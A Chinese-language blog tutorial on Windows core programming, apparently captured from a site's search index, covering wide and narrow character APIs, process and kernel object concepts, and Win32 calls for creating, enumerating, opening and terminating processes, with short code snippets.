        <content type="html"><![CDATA[<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>新建C++ 控制台应用</p><p>首先关闭SDL检查</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317404.png" alt="image-20211122121009588"></p><p>因为项目字符集的原因</p><p>以MessageBox为例子</p><p>Unicode字符集：宽字符集：MessageBoxW</p><p>使用多字节字符集：窄字符集：MessageBoA</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317720.png" alt="image-20211122102745702"></p><p>所以我们 针对字符串 有两种写法</p><p>使用L</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317490.png" alt="image-20211122102820137"></p><p>使用TEXT</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317734.png" alt="image-20211122103119316"></p><p>效果都是一样的</p><p>我们现在链接器的子系统，用的是控制台</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317766.png" alt="image-20211122103203896"></p><p>当我们切换到窗口 就是Windows 桌面应用程序</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317781.png" alt="image-20211122103230074"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261317829.png" alt="image-20211122103245156"></p><p>报错的原因是因为 主函数不在是main了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318712.png" alt="image-20211122103412404"></p><p>新建Windows 桌面应用程序</p><p>它的主函数是wWinMain</p><pre class="line-numbers language-none"><code class="language-none">int APIENTRY wWinMain(_In_ HINSTANCE hInstance,                     _In_opt_ HINSTANCE hPrevInstance,                     _In_ LPWSTR    lpCmdLine,                     _In_ int       nCmdShow)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318938.png" alt="image-20211122103819319"></p><p>可以看到是成功的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318783.png" alt="image-20211122104006447"></p><h2 id="Windows进程"><a href="#Windows进程" class="headerlink" title="Windows进程"></a>Windows进程</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul><li><p>进程是一个正在运行的程序，拥有自己的虚拟地址空间、 代码、数据和其它系统资源。 </p></li><li><p>组成windows进程的两个部分： </p><pre class="line-numbers language-none"><code class="language-none">1.进程内核对象2.私有的虚拟地址空间<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>程序与进程的区别：</p><pre class="line-numbers language-none"><code class="language-none">1.程序是有序静态指令集。 2.进程是所用资源的容器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>Windows中进程是获取资源的单位，每个应用程序启动后都会对应的启动一个进程，但进程只是一个壳，它不会去执行代码，执行代码需要靠进程中的线程来完成。 </p></li><li><p>线程是进程内执行代码的独立实体，因此一个进程中至少应该有一个线程，一般来说，启动进程后启动的第一个线程就是主线程，线程理论上没有自己的内存，它所使用的内存都是归属于进程的</p></li><li><p>简单理解就是 进程是提供场地，线程是在场地工作的人</p></li></ul><h3 id="进程的基本状态"><a href="#进程的基本状态" class="headerlink" title="进程的基本状态"></a>进程的基本状态</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318179.png" alt="image-20211122104641217"></p><p>阻塞态：比如等待用户输入</p><h3 id="Windows多任务"><a href="#Windows多任务" class="headerlink" title="Windows多任务"></a>Windows多任务</h3><ul><li>多任务是指用户可以在同一时间内运行多个应用程序,每个应用程序被称作一个任务。 </li><li>Windows多任务处理采用的是被称为虚拟机(Virtual Machine)的技术。虚拟机实际上指的是由Windows在内存中创建的逻辑微机,由 它来运行应用程序。当Windows接受到由鼠标、键盘、定时 器信 号或某些I/O操作产生的”事件”后,为该任务分配CPU时间。每个任 务使用由Windows分配的短暂的时间片(Timeslice)轮流使用 CPU,由 于CPU对每个时间片的处理速度非常快,在用户看来好像这些任务在同时执行</li></ul><p>一个简单的场景</p><p>我们同时拷贝10个文件，不如一个一个拷贝文件快</p><p>这就涉及到Windows多任务</p><p>当我们同时拷贝时，其实中间是要切换的，根据占用cpu的资源片</p><p>因为切换是要花时间的，所以慢</p><h3 id="内核模式和用户模式"><a href="#内核模式和用户模式" class="headerlink" title="内核模式和用户模式"></a>内核模式和用户模式</h3><p>Intel的CPU将权限级别分为4个级别： </p><p>RING0、RING1、RING2、RING3</p><p>Windows只使用其中的两个级别RING0和 RING3，RING0(内核层)只给操作系统用，RING3(用户层)谁都能用。</p><p>如果普通应用程序企图执行RING0指令，则Windows会显示”非法指令”错误信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318605.png" alt="image-20211122105616568"></p><h3 id="内核对象"><a href="#内核对象" class="headerlink" title="内核对象"></a>内核对象</h3><ul><li>内核对象是系统提供的用户模式下代码与内核模式下代码进行交互的基本接口。 </li><li>应用程序无法直接访问内核对象，只能通过特定的函数间接访问内核对象。</li></ul><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318754.png" alt="image-20211122105657373"></p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><pre class="line-numbers language-none"><code class="language-none">1.为系统资源提供可识别的名字2.在进程之间共享资源和数据3.保护资源不会被非法访问4.跟踪对象的引用情况。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="对象句柄"><a href="#对象句柄" class="headerlink" title="对象句柄"></a>对象句柄</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318018.png" alt="image-20211122105928387"></p><p>简单来说，句柄是指针的标识</p><h3 id="使用计数"><a href="#使用计数" class="headerlink" title="使用计数"></a>使用计数</h3><pre class="line-numbers language-none"><code class="language-none">1.使用计数是内核对象中的一个属性。2.使用计数是对程序复用次数的记录。3.使用计数是对资源使用状况的记录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一个场景</p><p>A、B、C三个程序要使用内核对象，为他们建三个内核对象，显然是很消耗内存的</p><p>而我们的做法是：这个内核对象使用计数，有A、B、C三个程序，避免了占用内存</p><p>机制就是：没人使用这个内核对象，内核对象就销毁了</p><h2 id="程序入口"><a href="#程序入口" class="headerlink" title="程序入口"></a>程序入口</h2><p>w：意思是宽字符集</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261318570.png" alt="image-20211122110927931"></p><h2 id="获取系统版本信息"><a href="#获取系统版本信息" class="headerlink" title="获取系统版本信息"></a>获取系统版本信息</h2><p>后面会具体写一下</p><pre class="line-numbers language-none"><code class="language-none">OSVERSIONINFO vs = {sizeof(vs)};GetVersionEx(&amp;vs);DWORD dwBaseAddr;if(vs.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS){printf("This is windows 98...\n");dwBaseAddr = 4 * KONEK * KONEK;}else if(vs.dwPlatformId == VER_PLATFORM_WIN32_NT){printf("This is windows NT...\n");dwBaseAddr = 64 * KONEK}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><pre class="line-numbers language-none"><code class="language-none">BOOL CreateProcess(//可执行文件的名称LPCTSTR lpApplicationName,//指定了要传递给执行模块的参数LPTSTR lpCommandLine,//进程安全性LPSECURITY_ATTRIBUTES lpProcessAttributes,//线程安全性LPSECURITY_ATTRIBUTES lpThreadAttributes,//指定了当前进程中可继承句柄是否可被新进程继承BOOL bInheritHandl//指定进程优先级和其它创建标志DWORD dwCreationFlags,//指定新进程使用的环境变量LPVOID lpEnvironment,//新进程使用的当前目录LPCTSTR lpCurrentDirectory,//指定新进程中主窗口的位置、大小和标准句柄等LPSTARTUPINFO lpStartupInfo,//返回新建进程的标志信息，如ID号、句柄等LPPROCESS_INFORMATION lpProcessInformation);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中涉及到一个结构体参数</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _STARTUPINFO{DWORD cb; //本结构的长度LPTSTR lpReserved; //保留字段LPTSTR lpDesktop; //指定桌面名称LPTSTR lpTitle; //指定控制台窗口标题DWORD dwX; //指定新窗口的位置和大小DWORD dwY;DWORD dwXSize;DWORD dwYSize;//指定控制台窗口行列数DWORD dwXCountChars;DWORD dwYCountChars;//用于设定控制文本和背景颜色DWORD dwFillAttribute;DWORD dwFlags;WORD wShowWindow; //窗口显示方式WORD cbReserved2; //保留，必须为0LPBYTE lpReserved2; //保留，必须为NULLHANDLE hStdInput; //控制台标准句柄HANDLE hStdOutput;HANDLE hStdError;} STARTUPINFO, *LPSTARTUPINFO;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>简单的使用</p><ul><li>创建新的控制台 </li></ul><pre class="line-numbers language-none"><code class="language-none">CreateProcess(NULL, TEXT("cmd"), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建非控制台进程 </li></ul><pre class="line-numbers language-none"><code class="language-none">CreateProcess(NULL, “notepad.exe” , NULL, NULL, FALSE, NULL, NULL, NULL, &amp;si, &amp;pi); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>创建自定义程序的进程 </li></ul><pre class="line-numbers language-none"><code class="language-none">CreateProcess(NULL, ”aaa.exe” , NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si, &amp;pi);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>获取系统进程 </p><pre class="line-numbers language-none"><code class="language-none">PROCESSENTRY32CreateToolhelp32SnapshotProcess32First Process32Next <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>打开进程 OpenProcess </p><p>终止当前进程 ExitProcess </p><p>终止其它进程 TerminateProces</p><h3 id="遍历进程"><a href="#遍历进程" class="headerlink" title="遍历进程"></a>遍历进程</h3><pre class="line-numbers language-none"><code class="language-none">//创建系统进程快照(内核对象+1)HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);//获取第一个进程信息BOOL bMore = Process32First(hProcessSnap, &amp;pc);//获取其余进程信息while(bMore){printf("进程ID:%d\n", pc.th32ProcessID);printf("进程名称：%s\n", pc.szExeFile);bMore = Process32Next(hProcessSnap, &amp;pc);}//关闭系统进程快照(内核对象-1)CloseHandle(hProcessSnap);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="打开进程"><a href="#打开进程" class="headerlink" title="打开进程"></a>打开进程</h3><p>已经存在的进程需要通过OpenProcess函数打开该进程，并获取该进程的句柄</p><pre class="line-numbers language-none"><code class="language-none">HANDLE OpenProcess(//获取权限，PROCESS_ALL_ACCESSDWORD dwDesiredAccess,BOOL bInheritHandle, //指定句柄是否可以继承DWORD dwProcessId //打开进程的ID)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="终止当前进程"><a href="#终止当前进程" class="headerlink" title="终止当前进程"></a>终止当前进程</h3><p>进程中一个线程调用了ExitProcess函数。 </p><p>其它进程中的一个线程调用了TerminateProcess。</p><pre class="line-numbers language-none"><code class="language-none">//打开进程,获取句柄HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwId);if(hHandle != NULL){//终止进程TerminateProcess(hHandle, 0);}//关闭句柄CloseHandle(hHandle);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="进程退出"><a href="#进程退出" class="headerlink" title="进程退出"></a>进程退出</h3><pre class="line-numbers language-none"><code class="language-none">BOOL GetExitCodeProcess(HANDLE hProcess, //进程句柄PDWORD pdwExitCode //进程的退出代码);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pragma-once"><a href="#pragma-once" class="headerlink" title="#pragma once"></a>#pragma once</h2><p>防止因为：层叠包含可能会引起编译器的错误</p><p>等于</p><pre class="line-numbers language-none"><code class="language-none">一个头文件:func.h#ifndef FUNC_H#define FUNC_H内容#endif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 进程-基础篇 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
